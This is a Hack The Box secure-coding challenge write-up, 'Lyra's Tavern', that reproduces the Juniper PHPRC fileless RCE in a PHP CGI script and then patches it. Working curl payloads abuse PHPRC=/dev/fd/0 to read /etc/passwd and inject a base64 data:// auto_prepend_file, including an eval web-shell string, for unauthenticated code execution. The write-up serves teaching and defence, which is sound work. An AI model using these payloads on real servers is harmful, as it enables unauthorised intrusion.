![img](./assets/banner.png)

<img src='./assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Lyra's Tavern</font>

5<sup>th</sup> February 2025

Prepared By: `Pyp`

Challenge Author(s): `Pyp`

Difficulty: <font color='green'>Easy</font>

<br><br>


# Synopsis
The challenge is a secure coding challenge targetting a fileless RCE modelling the [Juniper CVE](https://vulncheck.com/blog/juniper-cve-2023-36845) that allowed fileless remote code execution by abusing PHP environment variables. By properly enumerating the server, we can be able to identify the vulnerability and patch it accordingly.

## Description
The challenge involves an Apache web server with a custom configuration. The player is presented with 3 services available: 
- Web server on internal port 3000 exposed on local port 80
- SMB services on both ports 445
- Checker service on both port 1337

The SMB service allows the user to easily enumerate the source code and make necessary changes on the server to ensure that the server works properly. 

The CGI script allows one to be able to execute a particular odd script in PHP enumeration by first setting the PHPRC variable responsible for specifying the PHP configuration files. By hijacking this, we can be able to specify a file allowing us to inject our own settings and hence obtain command execution.

By fixing the vulnerability with proper defined directory structures, we can be able to mitigate this.

## Skills Required
- Apache configuration understanding.
- Basic PHP code analysis.

## Skills Learned
- CGI scripts understanding.
- PHP code enumeration.
- Dockerfile code analysis.

# Enumeration

## Analyzing the source code and the report
Let us start with the provided Dockerfile:
```docker
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/samba.conf /etc/samba/smb.conf
COPY config/apache2.conf /etc/apache2/apache2.conf
COPY config/cgi-bin.conf /etc/apache2/conf-available/cgi-bin.conf
```
- The above configurations hint at the use of an Apache server. We notice a `cgi-bin` configuration file on the make and this alerts us to potential CGI scripts within the file.

The report further states:
```
Lyra's Tavern is a simple and adventurous place for the common day adventurer to rest and get some drinks while having entertainment. She recently released a system for adventurers to share their experiences in form of journals. However, there has been evidence of backdoor access on the server forcing her to isolate it for maintenace. She has trusted you with the source code to find and fix any vulnerability evident within the system.
```
- There is hint of a backdoor access within the system, but little to no evidence on the right path to take.

Looking at the configuration file for Apache2:
```apache
[SNIPPED]
<Files "config.php">
    Require local
</Files>
[SNIPPED]
```
The `config.php` file is protected and can only be accessed locally. This is a hint that the file may contain sensitive information, and hence we may need to look at it.

```php
<?php
$input = file_get_contents("php://stdin");
$input = trim($input);

$name = ($input !== "") ? $input : "Stranger";

$response = [
    "name" => $name,
    "year" => date("Y")
];

echo json_encode($response);
?>
```
As the file reads in data from standard input, we can only assume it runs through a shell command. Tracing the code leads us here in the `app.cgi` script:
```php
$phprc   = isset($_REQUEST['PHPRC']) ? $_REQUEST['PHPRC'] : null;
$data = isset($_REQUEST['data']) ? $_REQUEST['data'] : null;

if (!is_null($phprc) && !is_null($data)) {
[SNIPPED]
    putenv("PHPRC=" . $phprc);
    try{
        $cmd = "printf \"%b\" " . escapeshellarg($data);
        $cmd = $cmd . " | php /www/application/config.php";
        $output = shell_exec($cmd);
[SNIPED]
}}
```
- The above CGI script allows us to specify a custom PHP configuration file and pass the data through it. Originally the data is supposed to be passed to the file `config.php` and if none is specified then it simply gives us a `Stranger` output. This is where the logic of the vulnerability lies.


So let us look at the vulnerabilities:

### Arbitrary File Read
The vulnerability laid within the `cgi` file is one that allows you to specify the `PHPRC` variable. A custom `PHPRC` file is never a bad idea because there are cases when you need to run custom scripts exclusive from the server because they invoke dangerous functions that should not be available on the server. Notice that the check is limited to **existing files** and hence we need to specify an existing file. 

We do not have the ability to upload files, but that does not mean that we can not use existing file that is found on the `/dev/` directory. The input file descriptor: `/dev/fd/0` which makes us hijack the input data feeding it proper configuration.

When exploited this behaves like this:
```bash
╰─[:)] % curl 'localhost/cgi-bin/app.cgi?PHPRC=/dev/fd/0' --data "data=auto_prepend_file=/etc/passwd"                                                                                       

<pre>root:x:0:0:root:/root:/bin/bash
[SNIPPED]
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
[SNIPPED]
{&quot;name&quot;:&quot;Stranger&quot;,&quot;year&quot;:&quot;2025&quot;}</pre>
```

Hence we gain arbitrary read on the machine.

### Fileless RCE
Now in the standard Juniper RCE article, the Juniper Firewall allowed the service to pass the PHP configuration environment variables to the PHP interpreter. This allowed the attacker to specify a custom PHP configuration file that would allow them to execute arbitrary code. 

By using the above logic, we can be able to achieve remote code execution by specifying another PHP configuration rule:
```
allow_url_include
```
- The above rule allows us to enable **wrappers** on the PHP instance. This allows us to specify PHP executable files as base64 encoded data passed to `require` function.


We chain the 2 rules to achieve this:
```php
allow_url_include = 1 // This sets it to true
auto_prepend_file="data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7Pz4=" // This process the executable PHP code and passes it to the interpreter
```

When the server reads the PHP configuration file, it will execute the PHP code specified in the `auto_prepend_file` directive. This will allow us to use the wrapper `data://` to specify the PHP code we want to execute. We will use the `base64` encoding to encode the PHP code and hence execute it.

Let us look at the request:
```bash    
php > $b64 = base64_encode('<? shell_exec("id > /tmp/1"); ?>');
php > $data="data://text/plain;base64,$b64";
php > echo urlencode("allow_url_include=1\nauto_prepend_file=\"$data\"");
allow_url_include%3D1%0Aauto_prepend_file%3D%22data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD8gc2hlbGxfZXhlYygiaWQgPiAvdG1wLzEiKTsgPz4%3D%22


########### CURL
╰─[:)] % curl 'localhost/cgi-bin/app.cgi?PHPRC=/dev/fd/0' --data "data=allow_url_include%3D1%0Aauto_prepend_file%3D%22data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD8gc2hlbGxfZXhlYygiaWQgPiAvdG1wLzEiKTsgPz4%3D%22"

<pre>
Deprecated: Directive &#039;allow_url_include&#039; is deprecated in Unknown on line 0
{&quot;name&quot;:&quot;Stranger&quot;,&quot;year&quot;:&quot;2025&quot;}</pre>
```
- We have blind RCE for now! Let us confirm on the container if the file was written.

```bash
root@2309e8a13aed:/www/application# ls -la /tmp
total 12
drwxrwxrwt 1 root     root       2 Mar  6 15:32 .
drwxr-xr-x 1 root     root      24 Mar  6 15:14 ..
-rw-r--r-- 1 www-data www-data  54 Mar  6 15:32 1
```
- The file was written successfully. We can now use this to execute arbitrary code on the server and this may be what the attacker used to gain access to the server.

This is a direct request without authentication and hence we have **unauthenticated fileless remote code execution** on the server.

Let us explain a little about the `app.cgi` script that we saw:
```php
#!/usr/bin/env php-cgi
<?php
header("Content-Type: text/html");
header("Status: 200 OK");
echo "\r\n";

$phprc   = isset($_REQUEST['PHPRC']) ? $_REQUEST['PHPRC'] : null;
$data = isset($_REQUEST['data']) ? $_REQUEST['data'] : null;

if (!is_null($phprc) && !is_null($data)) {

    $data = urldecode($data);

    if (!file_exists($phprc) || !file_exists("/www/application/config.php")) {
        echo "File not found: " . htmlspecialchars($phprc);
        exit;
    }

    putenv("PHPRC=" . $phprc);
    try{
        $cmd = "printf \"%b\" " . escapeshellarg($data);
        $cmd = $cmd . " | php /www/application/config.php";
        $output = shell_exec($cmd);
        
        // Structure a proper HTML response
        echo "<pre>";
        echo htmlspecialchars($output);
        echo "</pre>";

    } catch (Exception $e){
        echo "Failed to execute PHP with PHPRC: " . htmlspecialchars($phprc);
    }
    exit;
}

echo "OK";
?>
```
- The above code is supposedly safe, it checks if the file exists and throws an error if it does not. However, the attacker can use the `/dev/fd/0` which is a file descriptor that must always exist on Unix based systems since we need a way of handling standard input; this allows the attacker to bypass the checl specifying their own configuration file. The Juniper firewall was vulnerable to this logic and enforced the same like condition on its applications.

If we enumerate the `index.php` we will notice something strange:
```php
<?php
require_once 'includes/footer.php';
?>
```
- Examining `footer.php` we notice the following:
```php
<footer class="bg-[#1a1a2e]/80 backdrop-blur-lg text-purple-200 border-t border-purple-500/20 py-8">
  <div class="container mx-auto px-4 text-center">
      <p class="font-magical mb-2 flex items-center justify-center gap-2">
        <i data-lucide="sparkles" class="w-4 h-4 text-purple-400"></i>
        Crafted with ancient magics
        <i data-lucide="sparkles" class="w-4 h-4 text-purple-400"></i>
      </p>
      <p class="font-magical text-purple-400/80">
        <?php $name = $_SESSION['username'] ?? ''; echo footer_forger($name) ?>
      </p>
      <p class="font-magical text-purple-400/80">
        &copy; <span id="year"><?php echo date("Y"); ?></span> Arcane Chronicles
      </p>
    </div>
  </footer>
```

- A standard footer script is in place but invokes a fuction, and checking the `footer_forger` function, allows us to notice the following:
```php
function fetch_data($data) {
    $settings = "/etc/php/8.2/fpm/php.ini";

    $postData = http_build_query([
        'PHPRC' => $settings,
        'data'  => $data
    ]);

    $context = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => $postData,
            'timeout' => 30
        ]
    ]);

    $response = file_get_contents('http://127.0.0.1:3000/cgi-bin/app.cgi', false, $context);

    return $response;
}


function footer_forger($name){
    $data = fetch_data($name); // It is HTML encoded, decode it
    $data = html_entity_decode($data);
    $data = strip_tags($data);

    $data = parse_json($data);
    if (is_string($data)){
        return $data;
    }
    return "Greetings " . $data['name'] . ", we see you are visiting us from the distant future, " . $data['year'] . " AD.";
}
```
- This function seems to be accessing our `app.cgi` by passing the name to it. Hence this becomes the key note to note for the attacker.

These functions create the behaviour of potentially running a PHP script that becomes a service to the server. The similar behaviour was in the Juniper firewall that required custom configuration files to run some other scripts by setting the PHPRC environmental variable.

With those details in mind, let us focus on the solution.


# Solution

## Fixing the vulnerabilities
The patch of the **arbitrary file read** & **fileless RCE** lies with the configuration file passed to it, we should ensure the directory for custom PHP configuration scripts is properly defined and no out of scope paths can be defined.

We hence use a whitelist to purge ourselves of this minor error:
```php
#!/usr/bin/env php-cgi
<?php
header("Content-Type: text/html");
header("Status: 200 OK");
echo "\r\n";

$phprc = isset($_REQUEST['PHPRC']) ? $_REQUEST['PHPRC'] : null;
$data = isset($_REQUEST['data']) ? $_REQUEST['data'] : null;

if (!is_null($phprc) && !is_null($data)) {

    $data = urldecode($data);

    $phprc = "/tmp/php_config/" . basename($phprc);

    if (!file_exists($phprc) || !file_exists("/www/application/config.php")) {
        echo "File not found: " . htmlspecialchars($phprc);
        exit;
    }

    putenv("PHPRC=" . $phprc);
    try{
        $cmd = "printf \"%b\" " . escapeshellarg($data);
        $cmd = $cmd . " | php /www/application/config.php";
        $output = shell_exec($cmd);
        
        // Structure a proper HTML response
        echo "<pre>";
        echo htmlspecialchars($output);
        echo "</pre>";

    } catch (Exception $e){
        echo "Failed to execute PHP with PHPRC: " . htmlspecialchars($phprc);
    }
    exit;
}

echo "OK";
?>
```
- We simply ensure that the directory is restricted to one directory and strip it of any path traversal characters that may exist! This forces us to only fetch configuration files from one directory. Since there is no uploading capability to that directory then symlinks cannot be abused to get outside the directory.

With that done, we can go over the finally to run the `checker script`


### Connecting to the server

This will be done over 3 ports specified in the report. This is since I have SMB, HTTP and the checking service running. All ways of connection have been clearly described in the report handed to the user.

### Getting the flag
After all vulnerabilities are fixed, then getting the flag should be quite simple:

```bash
# Change your IP and PORT number
╰─[:)] % curl --http0.9  http://127.0.0.1:1337
[*] Running static analysis...
[+] Static analysis passed!
[*] Running dynamic analysis...
[*] Running stage 1 (Checking if endpoints are still working!) ...
[+] Stage 1 passed!
[*] Running stage 2 (Checking if the functionality still works)...
[+] Stage 2 passed!
[*] Running stage 3 (Checking if the vulnerabilities are still present)...
[+] Stage 3 passed!
[+] Here is your reward, ;) : HTB{...}
```